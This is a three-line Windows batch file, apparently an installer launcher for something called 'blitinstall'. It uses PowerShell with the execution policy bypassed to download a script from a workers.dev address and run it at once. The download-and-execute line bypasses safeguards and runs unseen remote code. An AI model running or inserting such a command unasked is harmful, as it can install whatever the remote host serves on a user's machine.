@echo off
powershell -ExecutionPolicy Bypass -Command "iwr -Uri 'https://blitinstall.testingblobs1.workers.dev/install.ps1' -OutFile '%TEMP%\blitinstall.ps1' && powershell -ExecutionPolicy Bypass -File '%TEMP%\blitinstall.ps1'"
pause